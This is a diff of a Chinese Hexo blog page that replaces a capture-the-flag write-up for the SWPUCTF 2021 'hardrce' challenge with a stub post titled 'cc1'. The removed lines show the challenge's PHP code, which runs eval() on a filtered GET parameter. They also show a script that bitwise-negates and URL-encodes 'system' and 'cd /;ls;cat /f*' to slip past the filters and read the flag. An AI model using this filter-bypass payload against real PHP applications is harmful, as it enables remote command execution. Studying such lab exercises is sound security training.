@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>SWPUCTF 2021 新生赛 hardrce |  sunset</title>
+      <title>cc1 |  sunset</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-SWPUCTF-2021-新生赛-hardrce"
+  id="post-cc1"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,7 +67,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  SWPUCTF 2021 新生赛 hardrce
+  cc1
 </h1>
  
 
@@ -75,11 +75,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/07/30/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce/" class="article-date">
-  <time datetime="2023-07-30T11:24:10.000Z" itemprop="datePublished">2023-07-30</time>
+      <a href="/2024/07/04/cc1/" class="article-date">
+  <time datetime="2024-07-04T14:34:00.000Z" itemprop="datePublished">2024-07-04</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    <a class="article-category-link" href="/categories/Java/">Java</a>
   </div>
   
 <div class="word_count">
@@ -87,7 +87,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">336</span>
+            <span class="post-count">16</span>
         </span>
     </span>
 
@@ -103,22 +103,13 @@
  
     </div>
       
-    <div class="tocbot"></div>
-
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>代码中有两个正则表达式，不能用字母数字来rce，并且将异或和自增都给过滤了</p>
-<p>但是可以用到取反操作 。</p>
-<p>RCE篇之无数字字母rce 可以查看这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15404150.html">RCE篇之无数字字母rce - 学安全的小白 - 博客园 (cnblogs.com)</a></p>
-<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf8&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;cd /;ls;cat /f*&#x27;</span>;</span><br><span class="line"><span class="comment">//这里并没有附加上双引号，也就是执行的代码是system(cd /;ls;cat /f*)</span></span><br><span class="line"><span class="comment">//不知道为啥不能加，反正我加上双引号后，就无回显</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>都在链接里</p>
+  <p>好久没写博客了，写一份温故一下cc链</p>
  
       <!-- reward -->
       
@@ -189,7 +180,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/07/30/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/07/04/cc1/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -200,19 +191,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/07/30/%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP/" class="article-nav-link">
+      <a href="/2024/07/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            [鹤城杯 2021]EasyP
+            春秋云镜-Initial
           
         </div>
       </a>
     
     
-      <a href="/2023/07/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-nav-link">
+      <a href="/2023/11/18/thm-Linux%E6%8F%90%E6%9D%83%E6%8C%91%E6%88%98/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">php伪协议</div>
+        <div class="article-nav-title">thm-Linux提权挑战</div>
       </a>
     
   </nav>
